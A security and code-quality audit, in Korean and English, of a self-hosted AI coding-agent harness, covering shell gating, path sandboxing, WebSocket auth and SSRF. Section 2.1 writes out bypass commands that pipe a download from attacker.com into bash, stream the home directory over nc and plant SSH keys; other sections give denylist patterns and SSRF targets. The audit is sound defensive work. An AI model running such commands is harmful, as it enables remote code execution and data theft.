# Codebase Concerns — harness

**Analysis Date:** 2026-04-22
**Scope:** Tracked source (`main.py`, `agent.py`, `config.py`, `profile.py`, `tools/`, `session/`, `evolution/`, `context/`, `skills/`) + gitignored runtime surfaces (`harness_server.py`, `ui/index.js`) because they are live and load-bearing in practice.

---

## 0. 배포 시나리오 및 실행 계획

**확정 시나리오 (2026-04-22):**
- 집 머신 = `harness_server.py` + Ollama 서버 상시 구동
- 외부 사용자 2명 = `git clone` → `ui/index.js`로 집 머신 WS 접속
- **현재는 로컬 개발 단계**, 개발 완료 후 집 머신 배포 예정

**즉 보안 이슈는 "긴급"이 아니라 "배포 게이트"로 취급.** 단, 🔴 블로커는 서버 플로우를 테스트하려는 순간 필요.

### 🔴 블로커 — 서버 테스트/개발에 바로 필요

- [x] **1.1** `ws.request_headers` → `ws.request.headers` (websockets 16 API) — **FIXED 2026-04-22**
- [x] **1.3** `confirm_write(path)` → `(path, content=None)` 시그니처 정렬 — **FIXED 2026-04-22**

### 🟢 배포 전 체크리스트 — 집 머신 세팅 직전 반드시 (전부 완료 2026-04-22)

네트워크 하드닝:
- [x] `VALID_TOKENS` 비었을 때 서버 기동 **거부** — `harness_server.py:main()`, 명시적 에러로 `sys.exit(1)`
- [x] `HARNESS_BIND` 기본값 `127.0.0.1`로 변경 — `harness_server.py:23`, 외부 노출은 `HARNESS_BIND=0.0.0.0` opt-in

원격 사용자 샌드박싱:
- [x] `tools/shell.py` — `run_command` shell 인젝션 방어. 셸 메타문자 없으면 `shell=False + shlex.split`, 있으면 shell=True + dangerous 분류. 블랙리스트에 `curl|wget → bash`, `> /etc/`, `> /dev/`, `> ~/.ssh`, `eval`, `exec`, `find -delete/-exec`, `su` 추가
- [x] `read_file`/`write_file`/`edit_file`/`list_files`/`grep_search` 경로 검증 — `tools/fs.py` `_resolve_path()` + `set_sandbox()`. symlink escape는 `realpath` 해소 후 prefix 검증으로 차단. `profile.fs_sandbox` 플래그로 제어 (서버 Session 초기화 시 강제 True)
- [x] `run_python` — `agent.py`에서 항상 `confirm_bash` 요구 (approval_mode 무관). 원격 사용자는 클라이언트에 코드 미리보기 후 y/n

자가수정 가드:
- [x] `evolution/idle_runner.py:_should_run()` — `~/.harness/evolution/.remote_active` 파일 존재 시 스킵. 파일은 `harness_server.py`가 연결 중에만 유지
- [x] 자가수정 결과 `git commit` 강제 — `evolution/executor.py:_git_commit_evolution()`. 성공한 apply마다 변경 파일만 selective add → commit `evolution: <key>`. 작업 트리에 unrelated staged 변경 있으면 안전하게 skip

### 🟡 개발 품질 — 여유 될 때

- [x] `main.py` ↔ `harness_server.py` 오케스트레이션 중복 (§3.2) — **✅ FIXED 2026-04-23 (BB-1, harness_core/ 모듈로 13/14 슬래시 통합)**
- [x] 테스트 0개, `pyproject.toml` 없음 — **✅ FIXED 2026-04-22 (`df96a0d`, smoke 52건 → 현재 pytest 160건)**
- [x] `.gitignore` 모순 — **✅ FIXED 2026-04-22 (`22a8e23`)**

### ⚪ 나중에

- [x] `harness_app.py` 상태 결정 — **✅ 제거 완료 2026-04-22 (`22a8e23`)**

### 🟠 잔여 미해결 항목 요약 (2026-04-23 기준)

- §1 Bugs: **2건** — 1.10(H, run_command shell-quoting — sticky-deny로 부분 완화), 1.12(M, spinner vs Live)
- §2 Security: **1건** — 2.8(L, manual YAML)
- §3 Architecture: ~11건 (3.2/3.3 닫힘) — 3.1(H, main.py 1666줄)이 가장 큼
- §4 Performance: 5건 (전부 L/M)

---

## 1. Bugs & Correctness Issues

### 1.1 ~~`websockets>=14` API break — server will crash on any connection~~ ✅ FIXED 2026-04-22
- **Location:** `harness_server.py:365` + `.venv/lib/python3.14/site-packages/websockets-16.0.dist-info`
- **Description:** Handler reads `ws.request_headers.get('x-harness-token', '')`. `request_headers` was removed from the server-side connection object in `websockets` 14; 16.0 is installed. The new API is `websocket.request.headers`. As shipped, every connection with `HARNESS_TOKENS` set will raise `AttributeError` and close. Without tokens the handler still runs, but only because the auth branch is skipped.
- **Suggestion:** Replace with `ws.request.headers.get('x-harness-token', '')` (and handle case-insensitive header access). Add a minimal smoke test that opens a ws connection with a token.
- **Fix applied:** `ws.request_headers` → `ws.request.headers` (line 365). Smoke test confirmed: wrong token → 4401 rejected, valid token → state+ready received.

### 1.2 ~~`websockets.serve(handler, ...)` signature mismatch~~ ✅ FIXED 2026-04-23 (코드는 이미 신규 API, pyproject.toml에 `websockets>=16.0,<18` 상한 고정)
- **Location:** `harness_server.py:362,439` (`async def handler(ws)`)
- **Description:** Legacy `websockets` passed `(websocket, path)`; 13+ pass only `websocket`. Code here already uses the new single-arg form, which is fine — but combined with 1.1, it confirms the code was written against mid-transition docs. Audit any other docs/snippets that still show the 2-arg form.
- **Suggestion:** Pin `websockets>=13,<17` in a requirements file and add a startup self-check.

### 1.3 ~~`confirm_write` is called with `(path, content)` but `harness_server.py` defines it as `(path)`~~ ✅ FIXED 2026-04-22
- **Location:** `agent.py:208-210` calls `confirm_write(args.get('path', '?'), _cw_content)` for `write_file`; `harness_server.py:71` is `def confirm_write(path: str) -> bool`.
- **Description:** When `write_file` is invoked over the server UI, the inner call `confirm_write(path, content)` passes 2 positional args to a 1-arg function → `TypeError`. The agent catches `TypeError` (line 258) only for the tool call itself, not for callbacks, so the confirm path will raise and break the write flow.
- **Suggestion:** Change server signature to `def confirm_write(path: str, content: str = None)` and forward the diff to the UI so the server matches the CLI behavior added in `main.py:285`.
- **Fix applied:** `harness_server.py:71` signature is now `def confirm_write(path: str, content: str | None = None)`. Content is currently unused (not forwarded to UI) — future enhancement: show content/diff preview in WS confirm message.

### 1.4 ~~`/commit` intent + `/push` intent double-runs when user says "커밋하고 푸시"~~ ✅ FIXED 2026-04-23
- **Location:** `main.py:_is_commit_intent` 가드
- **Description (당시):** `_is_push_intent`/`_is_commit_intent`가 둘 다 True를 반환할 수 있어 dispatch 순서 fragility — push가 commit을 먼저 처리하지 않으면 commit 두 번 실행 위험.
- **Fix applied:** `_is_commit_intent`에서 `_is_push_intent(text)`이면 즉시 False 반환. push 분기가 commit 부분을 항상 같이 처리하므로 dispatch 순서에 무관. 단위 테스트 12건(`tests/test_main_intent.py`).
- **Suggestion:** Make intent detection mutually exclusive with a single classifier returning `'commit_push' | 'push' | 'pull' | 'commit' | None`.

### 1.5 ~~`_parse_text_tool_calls` JSON regex cannot handle nested braces~~ ✅ FIXED 2026-04-23
- **Location:** `agent.py:99` (`json_pattern = r'\{[^{}]*"name"...'`)
- **Description:** The character class `[^{}]` forbids any brace inside arguments, so tool calls whose `arguments` contain nested JSON objects (e.g. `{"filter": {"type": "eq"}}`) never match, and the model's text-form tool call is silently dropped. That's a real hole for MCP tools with structured inputs.
- **Suggestion:** Parse with `json.JSONDecoder.raw_decode` scanning for `{` and try to decode; fall back to the regex only as a last resort.

### 1.6 ~~`run_python` leaks temp files when interpreter is killed~~ ✅ FIXED 2026-04-23
- **Location:** `tools/shell.py:77-98`
- **Description:** `tempfile.NamedTemporaryFile(delete=False)` + `os.unlink` in `finally` is fine for normal exit, but the block does not catch `KeyboardInterrupt`. If the parent is `^C`ed between write and unlink, temp files accumulate in `$TMPDIR`. Also writes to disk even for trivial code — use `python3 -c`.
- **Suggestion:** Prefer `subprocess.run(['python3', '-c', code], …)` for small code; if a file is needed, wrap `subprocess.run` inside `try/finally` that also catches `BaseException`.

### 1.7 ~~`tools/fs.py:write_file` silently overwrites without dir check~~ ✅ PARTIAL 2026-04-23 (full-auto 모드에서 자동 샌드박스)
- **Location:** `tools/fs.py:28-36`
- **Description:** `os.makedirs(os.path.dirname(path) or '.', exist_ok=True)` — if `path` is e.g. `"/"` or `""`, `os.path.dirname` returns `""`/`"/"` and this either creates `.` (harmless) or attempts to write `/` (permission error). No guard against writing outside `working_dir` — the model can write to `~/.ssh/authorized_keys` in `full-auto` mode.
- **Suggestion:** In `write_file`/`edit_file`, reject absolute paths outside `working_dir` unless `approval_mode='full-auto'` and the user has opted in. Log any writes outside cwd.

### 1.8 ~~`list_files` leaks glob traversal outside cwd~~ ✅ PARTIAL 2026-04-23 (§1.7과 동일 — full-auto면 샌드박스 활성)
- **Location:** `tools/fs.py:110-120`
- **Description:** `list_files(pattern='/Users/**')` is happily expanded. No `cwd` pinning. Combined with `read_file` accepting `os.path.expanduser(path)` everywhere, a compromised model can enumerate `~/.ssh`, `~/.aws`, `~/.claude`.
- **Suggestion:** Normalize pattern relative to `working_dir` and reject absolute paths unless explicitly approved.

### 1.9 ~~`tools/hooks.py` swallows all errors, including hook-requested blocks~~ ✅ FIXED 2026-04-23
- **Location:** `tools/hooks.py:50-58`
- **Description (당시):** Both `TimeoutExpired` and generic `Exception` returned `True` ("allow tool") → 보안 hook이 잘못된 PATH/누락 바이너리로 실행 실패 시 silently bypass.
- **Fix applied:** `_fail_mode_allow()` 헬퍼 추가. timeout/exception 시 `HARNESS_HOOK_FAIL_MODE=allow` opt-in 없으면 **False**(deny) 반환. 기본 fail-close. 단위 테스트 9건(`tests/test_hooks.py`).

### 1.10 `run_command` shell-quoting relies on the model (High)
- **Location:** `tools/shell.py:55-74` uses `shell=True`
- **Description:** With `shell=True`, anything the model emits runs through `/bin/sh`. The `_DANGEROUS_RE` list uses `\b` boundaries, so trivial obfuscations bypass it: `r''m -rf ~`, `/bin/rm`, `busybox rm`, `python -c "import os; os.remove(...)"`, `find . -delete`, `> /etc/passwd` (redirect, no match), `curl host | sh`. None of those are in `_DANGEROUS`.
- **Suggestion:** Add: `>\s*/`, `find\b.*-delete`, `curl.*\|\s*sh`, `wget.*\|\s*sh`, `\|\s*sudo`, `/bin/(rm|mv)`, `python\b.*-c`, `bash\b.*-c`. Better: use a shell-lexer (shlex) to classify tokens rather than regex on raw strings. See §2.1.

### 1.11 ~~`context/indexer.py` uses ChromaDB default embeddings per project~~ ✅ FIXED 2026-04-23 (첫 다운로드 안내 추가)
- **Location:** `context/indexer.py:48-52`
- **Description:** `embedding_functions.DefaultEmbeddingFunction()` downloads a model on first use (ONNX, ~80 MB) and stores vectors per-project hash. For large repos the first `/index` blocks the REPL with no progress beyond a single spinner line. If the download fails silently (no network), `get_or_create_collection` raises and the error is not user-friendly.
- **Suggestion:** Probe model availability up front; print a clear "first-time download" banner; add `HARNESS_EMBED_MODEL` override.

### 1.12 `_spinner` thread prints escape sequences while `rich` Live renders may run (Medium)
- **Location:** `main.py:190-223`, interacts with `Live(...)` in `do_index` (main.py:409)
- **Description:** The custom spinner writes `\x1b[1A\r\x1b[K` directly to stdout from a daemon thread. If a `rich.Live` renderer is active concurrently (e.g. `/index` + pipe input race), the two compete for cursor position and produce broken frames. Low-probability but observed pattern with rich + raw ANSI.
- **Suggestion:** Use `rich.live.Live` + `Spinner` everywhere and delete the hand-rolled spinner.

### 1.13 ~~`compact` recursion hazard on tiny sessions~~ ✅ FIXED 2026-04-23
- **Location:** `session/compactor.py:26-29,66-70`
- **Description:** `needs_compaction` returns True when non-system chars > 20 000. If `KEEP_RECENT=10` recent messages alone exceed 20 000 chars (single large tool output can do that — `MAX_TOOL_RESULT_CHARS=20_000` by itself), `compact` keeps returning the same list with `dropped=0` and the condition stays true → possible spin in long loops. Currently only called once per user turn, so it does not loop, but the invariant is fragile.
- **Suggestion:** Compact based on token-weighted budget and truncate the largest individual message if trimming recents is insufficient.

### 1.14 ~~`_summarize` falls back to placeholder text, silently losing history~~ ✅ FIXED 2026-04-23
- **Location:** `session/compactor.py:57-58`
- **Description:** If Ollama is unreachable during compaction, the summary becomes `"(이전 N개 메시지 압축됨)"` — the original messages are still discarded. Agent continues with a system prompt that only says "N messages were compressed", losing all prior state.
- **Suggestion:** On summarization failure, keep the original messages and skip compaction; surface the error.

### 1.15 ~~`_build_claude_context` truncates each message to 800 chars without marking truncation~~ ✅ FIXED 2026-04-23
- **Location:** `main.py:720-723`
- **Description:** The slice `content[:800]` silently drops the tail. Claude reviewing results in `/cloop` may miss the actual outcome (tool outputs are the last part).
- **Suggestion:** Use head+tail truncation with a `…[N chars omitted]…` marker, or prioritize the final N chars for tool outputs.

### 1.16 ~~`/improve` and `/learn` ignore `confirm_bash` and run hooks on a different working_dir~~ ✅ FIXED 2026-04-23 (BB-1 7차에서 confirm_bash 회복, 이번에 hooks 스코프 정리)
- **Location:** `main.py:562-570` (improve), `main.py:622-630` (learn)
- **Description:** `do_improve` passes `working_dir=HARNESS_DIR` but `profile=profile` (user's project profile). Hooks are loaded from the user project profile yet triggered for commands executed inside harness itself — wrong scope. Also no `confirm_bash` is wired, so `run_command` is uncontrolled.
- **Suggestion:** When running self-improvement, load a `HARNESS_DIR`-scoped profile or use `profile={}` and wire both confirm callbacks.

### 1.17 ~~`ioreg` idle detection is macOS-only and silently returns 0 elsewhere~~ ✅ FIXED 2026-04-23
- **Location:** `evolution/idle_runner.py:18-31`
- **Description:** On Linux `get_idle_seconds` always returns 0.0, so `idle >= IDLE_THRESHOLD_SEC` is False forever and the daemon never triggers. No warning that non-macOS is unsupported.
- **Suggestion:** At import time `sys.platform != 'darwin'` → log a warning and exit; or add xprintidle/gdbus fallbacks.

### 1.18 ~~`/undo` loses tool messages~~ ✅ FIXED 2026-04-22 (커밋 0a584d9)
- **Location:** `main.py:982-991`
- **Description:** `/undo` pops the last two `non_system` entries but the conversation could end with many `tool` messages between `user` and the most recent `assistant`. Removing exactly 2 entries produces an inconsistent log (orphan tool results or missing user turn).
- **Suggestion:** Walk backwards from the end, pop until the last `user` message is removed, preserving role consistency.

### 1.19 ~~`profile._merge_toml` swallows all exceptions~~ ✅ FIXED 2026-04-22 (커밋 0a584d9)
- **Location:** `profile.py:87-100`
- **Description:** Any malformed `.harness.toml` (bad TOML, wrong types) is silently ignored with no log. User edits a config, nothing happens, no diagnostic.
- **Suggestion:** Catch `tomllib.TOMLDecodeError` specifically and surface a warning to the console.

### 1.20 ~~`record_tool_sequence` is called twice with different session_ids~~ ✅ FIXED 2026-04-22 (커밋 0a584d9)
- **Location:** `evolution/engine.py:46-54`
- **Description:** First call uses empty `session_id`, second uses the real one. First call pollutes the sequence store with a `''` bucket that accumulates forever.
- **Suggestion:** Remove the first call.

### 1.21 ~~`_stream_response` has no retry — any Ollama transient failure kills the turn~~ ✅ FIXED (커밋 `0e65f0c` 코드 + 단위 테스트 보강 2026-04-23)
- **Location:** `agent.py:57-92`
- **Description (당시):** `requests.post` 후 `raise_for_status()`. retry/backoff 없음 → 503/Timeout/ConnectionError 한 번에 turn 사망.
- **Fix applied:** 1s→2s→4s 지수 백오프 3회 retry. `requests.ConnectionError`, `requests.Timeout`, HTTP 5xx 모두 대상. 매 시도마다 `on_token`으로 `[Ollama 재연결 N/3 — Xs 대기: …]` 알림. 4xx는 즉시 raise. 단위 테스트 6건(`tests/test_agent_retry.py` — connection/timeout/5xx 재시도 + 4xx 즉시/3회 모두 실패 시 raise) 추가.

### 1.22 ~~`MAX_TOOL_RESULT_CHARS = 20_000` silently truncates without telling the model~~ ✅ ALREADY HANDLED (verified 2026-04-22)
- **Location:** `agent.py:13, 287-289`
- **Description (revised):** 초기 진단은 틀렸음. `agent.py:289`에 이미 `... [truncated: {omitted}자 생략. offset/limit으로 부분 읽기 또는 grep_search 사용]` 힌트가 포함돼 있음. 모델은 몇 자가 잘렸는지 알 수 있고 다음 액션 제안도 받음.
- **개선 여지 (Low):** 힌트 문구가 `read_file`용 `offset/limit` 중심. `run_command`, `grep_search`, `fetch_page` 등 다른 툴에서도 같은 문구가 출력됨. 툴별 맞춤 힌트를 줄 수 있으면 더 좋지만 현재 상태로도 충분.

---

## 2. Security Concerns

### 2.1 ~~`run_command` is shell-exec-as-a-service with weak regex gating~~ ✅ PARTIAL 2026-04-23 (BB-1 2차 shlex 분기 + 오늘 블랙리스트 대폭 확장)
- **Location:** `tools/shell.py:18-52`
- **Description:** `shell=True` + regex denylist is the textbook weak sandbox. Examples that slip past `_DANGEROUS_RE`:
  - `echo 'secret' > /tmp/exfil` (no dangerous token)
  - `curl -s attacker.com/payload.sh | bash` (no `\bkill\b`, `\brm\b`, etc.)
  - `printf 'pwned' > ~/.ssh/authorized_keys` (no match)
  - `find . -type f -name '*.env' -exec cat {} \;` (no match)
  - `tar cf - ~ | nc attacker.com 9999` (no match)
  In `full-auto` mode (config.APPROVAL_MODE='full-auto' or `/mode full-auto`) these run without any confirmation.
- **Suggestion:** Move to an allowlist for `full-auto` or require confirm on any redirect (`>`, `>>`), pipe-to-shell, `curl|wget` without `-o`, `nc`, `netcat`, `ssh`, `scp`, `rsync`, `eval`, `source`, backticks, `$()`. Ideally: drop `shell=True` for model-authored commands and run via a parsed argv allowlist.

### 2.2 ~~WebSocket server binds `0.0.0.0` by default with optional token~~ ✅ FIXED 2026-04-22 (기본 127.0.0.1, VALID_TOKENS 없으면 서버 거부)
- **Location:** `harness_server.py:22-24,364-368`
- **Description:** Default `BIND='0.0.0.0'` and `VALID_TOKENS = set()` when `HARNESS_TOKENS` is unset. `if VALID_TOKENS:` — so empty set means authentication is skipped entirely. Anyone on the LAN can open a WebSocket and execute arbitrary shell via the agent's tool calls. The server startup message prints "(인증 없음 — HARNESS_TOKENS 미설정)" but continues.
- **Suggestion:** Refuse to start when `BIND` is non-localhost without `HARNESS_TOKENS`. Default `BIND='127.0.0.1'`. Document the threat model in `CLIENT_SETUP.md` (currently silent on this).

### 2.3 ~~Token comparison is not constant-time~~ ✅ FIXED 2026-04-23 (hmac.compare_digest)
- **Location:** `harness_server.py:366` — `token not in VALID_TOKENS`
- **Description:** Python `set` lookup reveals length/prefix collisions via timing; for `openssl rand -hex 32` tokens this is low-risk, but the guidance is still to use `hmac.compare_digest`.
- **Suggestion:** Iterate with `hmac.compare_digest(token, v) for v in VALID_TOKENS`.

### 2.4 ~~`CLIENT_SETUP.md` instructs users to embed the token in shell alias~~ ✅ FIXED 2026-04-23 (0600 비밀 파일 + macOS keychain 권장)
- **Location:** `CLIENT_SETUP.md:52-54`
- **Description:** The guide literally tells users to put `HARNESS_TOKEN=토큰문자열` into `~/.zshrc`. That file is world-readable by default on shared machines and syncs to cloud backups. Tokens grant remote-shell access per §2.2.
- **Suggestion:** Recommend a secrets file sourced with `chmod 600` (e.g. `~/.harness.env`), or `security` keychain on macOS, or a short-lived prompt.

### 2.5 ~~`run_hook` passes tool args via `HARNESS_ARGS` env var as JSON~~ ✅ FIXED 2026-04-23 (stdin JSON, env는 HARNESS_ARGS_STDIN 마커만)
- **Location:** `tools/hooks.py:22-38`
- **Description:** Environment variables are inherited by any child process the hook spawns, leaking tool arguments (including file paths, commit messages, API keys if a tool ever receives them) into an arbitrarily complex process tree. Env also has shell size limits.
- **Suggestion:** Pass args via stdin JSON; or via a tmpfile path in an env var that the hook reads.

### 2.6 ~~No sandbox on `ask_claude` — full Claude Code runs with host privileges~~ ✅ PARTIAL 2026-04-23 (~/.harness/logs/claude.jsonl에 감사 추적 기록, 0600 권한. --model/permission 강제는 Claude CLI 플래그 확인 후 향후 추가)
- **Location:** `tools/claude_cli.py:19-58`
- **Description:** Delegating to the `claude` binary means Claude Code's own tool set runs without any of harness's approval gates. If the parent harness is in `full-auto`, Claude Code inherits whatever its own config says. Result: audit trail splits across two tools.
- **Suggestion:** When invoking Claude, force `--model` + restricted permission flags (if supported); log the delegated prompt + full response to `~/.harness/logs/claude.jsonl` for traceability.

### 2.7 ~~`fetch_page` has no SSRF protection~~ ✅ FIXED 2026-04-23 (scheme 필터 + 내부망 차단 + no-redirect)
- **Location:** `tools/web.py:69-83`
- **Description:** `urllib.request.urlopen(url)` follows redirects and resolves any scheme. Model can hit `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://localhost:11434/...` (internal Ollama admin endpoints), `file:///etc/passwd` (urllib historically allows file:// unless stripped).
- **Suggestion:** Enforce `url.scheme in ('http','https')`, resolve hostname, reject RFC1918/link-local/loopback, disable redirects or re-validate each hop.

### 2.8 `skills/__init__.py` parses YAML-like frontmatter by hand with `line.partition(':')` (Low — 관찰 노트)
**재평가 2026-04-23:** `partition(':')`은 첫 `:`만 split하므로 `ratio: 4.5:1` 같은 값도 올바르게 파싱됨.
리스트/중첩/멀티라인 값을 쓰려면 pyyaml 의존 추가가 필요하나 현재 프로젝트에서 그런 스킬 파일은 없어
실질 위험 0. 스킬 자체가 더 복잡해질 때 yaml.safe_load로 교체 권장.
- **Location:** `skills/__init__.py:20-26`
- **Description:** Keys/values containing `:` are corrupted (e.g. `description: ratio: 4.5:1`). Won't cause a crash but silently misreads keywords → skill never matches.
- **Suggestion:** Use `yaml.safe_load` on the frontmatter block.

### 2.9 ~~`session/store.py` writes to `~/.harness/sessions/` without chmod~~ ✅ FIXED 2026-04-23 (dir 0o700, file 0o600)
- **Location:** `session/store.py:6-21`
- **Description:** Sessions contain user prompts and tool outputs, potentially including API keys echoed into `run_command`, read file contents, etc. Default umask is 0022 → world-readable on multi-user systems.
- **Suggestion:** `os.chmod(path, 0o600)` after write; `os.makedirs(SESSION_DIR, mode=0o700, exist_ok=True)` (note: `mode` only applies to newly created dirs).

### 2.10 ~~`harness_server.py` loads per-connection `HARNESS_CWD` from server-side env~~ ✅ RESOLVED 2026-04-23 (BB-2로 자연 해결)
**경위:** BB-2(Phase 1~4) 도입으로 `Session`이 `Room.state` 단위로 묶이고, 같은 `--room`으로 들어온 멤버는 `/cd`/working_dir을 공유한다. `_solo_<UUID>` 룸은 매 연결 격리. 결과적으로 "공유는 의도된 공유, 솔로는 격리"가 되어 원래 우려한 "leak/혼선"은 더 이상 의미 없음.
- **Location (당시):** `harness_server.py:41`
- **Description (당시):** 모든 WS가 서버 기본 cwd에서 시작 → multi-client 혼선.
- **Resolution:** BB-2 룸 단위 격리(`_get_or_create_room`, `Room.state`)로 자연 해결. 추가 `set_cwd` 프로토콜은 불요. 룸 외부 root 제한이 추가로 필요하면 별도 phase에서.

---

## 3. Technical Debt

### 3.1 `main.py` is 1 680 lines and mixes REPL, rendering, agent orchestration, git plumbing, intent detection, banner art, and ≈15 slash commands (High)
- **Location:** `main.py` (entire file)
- **Description:** Symptoms: 3 duplicate spinners (`_Spinner` class, `rich.Live`, custom frames), global mutable state (`_token_buf`, `_ctx_display`, `_ui`, `_spinner`), 20+ module-level helpers, `handle_slash` is a ~300-line if/elif chain. Adding a new slash command requires editing 4 places (SLASH_COMMANDS, handler, help, completer meta).
- **Suggestion:** Extract a `commands/` package where each slash command is a module with `{name, help, handler(ctx, args)}`. Register them in a dict. Move UI into `ui/cli.py`.

### 3.2 ~~`main.py` and `harness_server.py` re-implement the same orchestration~~ ✅ FIXED (BB-1 1~9차 + 완결, 2026-04-23)
- **Location (당시):** `main.py` 973-1287 vs `harness_server.py` 178-314
- **Description:** Two divergent copies of `/improve`, `/learn`, `/cplan`, `/clear`, `/index`, `/cd` etc. Any bug fix must be applied twice (as seen with `confirm_write` signature drift — §1.3).
- **Fix applied:** `harness_core/{types,handlers,router}.py` 신설. 13/14 슬래시 양쪽 통합 (`/clear /undo /cd /init /save /resume /sessions /files /index /plan /cplan /improve /learn`). `/help`만 main 특화 유지 의도. `harness_app.py`는 별도 커밋(`22a8e23`)에서 제거. confirm_write/learn profile/improve on_tool drift 모두 정리.

### 3.3 ~~Circular-import smell: `harness_server.py` imports `CPLAN_PROMPT_TMPL` from `main`~~ ✅ FIXED (BB-1 완결 `045b246`, 2026-04-23)
- **Location (당시):** `harness_server.py:211`
- **Description:** Server did `from main import CPLAN_PROMPT_TMPL` inside a handler — entire REPL module executed.
- **Fix applied:** `slash_cplan` 핸들러를 `harness_core/handlers.py`로 이관. server는 `_sync_ask_claude`만 주입하는 형태로 변경. 런타임 `from main import` 제거.

### 3.4 `EDITABLE_FILES` allowlist is hardcoded in two places with no schema (Medium)
- **Location:** `tools/improve.py:11-20`, referenced in `evolution/executor.py:90-91`
- **Description:** Adding a new self-editable file requires editing `tools/improve.py`. The list is silent authority — any file not in it cannot be auto-improved, and no warning is produced when the model tries.
- **Suggestion:** Convert to `config.EDITABLE_FILES` and log "file not in allowlist" when mutation is attempted.

### 3.5 Korean natural-language intent detection is brittle substring matching (Medium)
- **Location:** `main.py:638-702`
- **Description:** 20+ trigger strings, regex-free, substring only. "커밋해줘" matches "커밋해" but also any longer text containing that substring. `_extract_commit_msg` strips trailing `줘` — Korean grammar much more varied than that.
- **Suggestion:** Let the LLM classify: a 1-shot call to Ollama to return `{intent: commit|push|pull|other, message: ...}` gives far better recall.

### 3.6 ChromaDB embedding re-runs on every `_index_file` for changed files without batching (Low)
- **Location:** `context/indexer.py:121-123`
- **Description:** `collection.upsert(...)` is called per file. For hundreds of files this is inefficient; the default embedding function batches internally but we still pay per-call overhead.
- **Suggestion:** Collect all docs across files into one `upsert` per sync.

### 3.7 Magic numbers scattered across files (Low)
- **Location:** `session/compactor.py:7` (`COMPACT_THRESHOLD=20000`), `agent.py:13` (`MAX_TOOL_RESULT_CHARS=20_000`), `tools/shell.py:6-9` (output caps), `config.py:25-27` (iteration caps)
- **Description:** Budget constants live in 4 modules and are not connected to `CONTEXT_WINDOW`. Changing `num_ctx` does not adjust compaction or tool result truncation.
- **Suggestion:** Derive from a single `BUDGETS = compute_budgets(CONTEXT_WINDOW)` object at startup.

### 3.8 `agent.py` tracks `_tool_call_history` but never clears on new user turn (Low)
- **Location:** `agent.py:274-318`
- **Description:** The repetition detector resets `_tool_call_history.clear()` only after it triggers. On a long multi-turn conversation the list grows unbounded. Memory is small, but the `REPEAT_WINDOW` check only looks at the last 3, so historical entries are dead weight.
- **Suggestion:** Reset at the top of `run()` or cap with `collections.deque(maxlen=10)`.

### 3.9 `_parse_text_tool_calls` accepts both XML and JSON, normalizes neither (Low)
- **Location:** `agent.py:94-115`
- **Description:** Two parsers, no unit tests, no precedence rule. If a model emits both forms in one turn they're concatenated and may double-execute.
- **Suggestion:** Pick one canonical form in the system prompt; parse the other only as a fallback.

### 3.10 `evolution/proposer.py:_analyze_sequences` has hardcoded English-to-Korean semantic mapping (Low)
- **Location:** `evolution/proposer.py:147-164`
- **Description:** Only 3 specific sequences are "valuable" — new sequence patterns are ignored. The dict is private and grows manually.
- **Suggestion:** Surface as `skills/*.md`-style rules file users can extend.

### 3.11 `~/.harness/` is the shared state root with no versioning (Medium)
- **Location:** `session/store.py:6`, `session/logger.py:5`, `context/indexer.py:9`, `evolution/*` (all), `tools/improve.py:9`
- **Description:** Sessions, logs, patterns, proposals, changelog, history, mtimes, idle locks all dumped flat. No schema version field → a future format change breaks old data silently.
- **Suggestion:** Add `~/.harness/version.json` and a lightweight migrator.

### 3.12 Unused module-level imports (Low)
- **Location:** `main.py:15-19` imports `Markdown`, `Text` (unused); `session/logger.py` no timezone awareness; `tools/web.py:5` imports `unicodedata` (unused).
- **Suggestion:** Run `ruff --select F401` once.

### 3.13 `config.py:runtime_override` mutates module globals (Medium)
- **Location:** `config.py:30-52`
- **Description:** `global MODEL, OLLAMA_BASE_URL, CONTEXT_WINDOW, OLLAMA_OPTIONS, APPROVAL_MODE`. Modules that `from config import MODEL` early will hold a stale reference. Most files use `config.MODEL` (correct), but `agent.py:15` builds `SYSTEM_PROMPT = f'...{config.MODEL}...'` at import time — before `runtime_override` runs. Result: the system prompt always names the `config.py` default, never the `.harness.toml` override.
- **Suggestion:** Build `SYSTEM_PROMPT` lazily inside `_build_system`.

---

## 4. Performance & Scalability

### 4.1 `_ctx_status` recomputes char count on every prompt (Low)
- **Location:** `main.py:1403-1416`
- **Description:** `sum(len(m.get('content') or '') for m in session_msgs)` is O(N·L) each turn. Negligible now; becomes real once sessions hit thousands of messages.
- **Suggestion:** Cache the rolling total, update on append.

### 4.2 `session/store.list_sessions` loads every session JSON just to compute previews (Medium)
- **Location:** `session/store.py:24-44`
- **Description:** `json.load(f)` for every session file on each `/sessions` or `load_latest` call. With hundreds of saved sessions this blocks the REPL.
- **Suggestion:** Cache preview/turns in filename or a sidecar `.idx.json`.

### 4.3 `evolution/executor.py:_run_implementation` hands `sources[:10000]` to the model (Medium)
- **Location:** `evolution/executor.py:114`
- **Description:** Hard truncation of concatenated source at 10 000 chars. Once the harness grows past that (already close: `main.py` alone is 60 KB), the self-improvement agent reasons over a partial view. It will produce plausible-looking diffs that break unseen code.
- **Suggestion:** Restrict to `affected_files` only, read each in full, and use a dedicated larger-context model path.

### 4.4 `context/retriever.py` calls `collection.count()` every search (Low)
- **Location:** `context/retriever.py:19`
- **Description:** ChromaDB `count()` is cheap but not free. Cache or use a sentinel for empty collection.

### 4.5 `/improve` reads entire log history and entire source set into one prompt (Medium)
- **Location:** `main.py:540-555`
- **Description:** `logs = read_recent(days=7)` returns up to 50 failure lines (capped), but `sources[:12000]` and logs together still bloat. Ollama prompts over ~16 K tokens on `qwen3-coder:30b` degrade quickly.
- **Suggestion:** Let the agent call `read_file` itself instead of pre-loading.

### 4.6 `record_tool_sequence` generates O(N) × 3 patterns on each call with JSON rewrite (Low)
- **Location:** `evolution/proposer.py:39-52`
- **Description:** For a session with 200 tool calls this is 600 patterns and a full JSON rewrite of `sequences.json`. Fine now, pathological at 10×.
- **Suggestion:** Append-only JSONL + periodic compaction.

### 4.7 MCP client `_read_loop` exits permanently on any `json.JSONDecodeError` (Medium)
- **Location:** `tools/mcp.py:123-142`
- **Description:** A single malformed line from a chatty MCP server (e.g. stderr that leaked to stdout) kills the reader thread. `call_tool` then hangs on its 30 s timeout for every subsequent request.
- **Suggestion:** Skip malformed lines; only break on `BrokenPipeError` / EOF.

---

## 5. Enhancement Opportunities

### 5.1 Add a test suite (High ROI)
- **Observation:** Zero test files across the repo (`find -name 'test_*'` empty). A single regression in `agent._parse_text_tool_calls` or `tools/shell.classify_command` silently degrades every session.
- **Suggestion:** Start with pytest tests for:
  - `classify_command` against a curated evil-command corpus
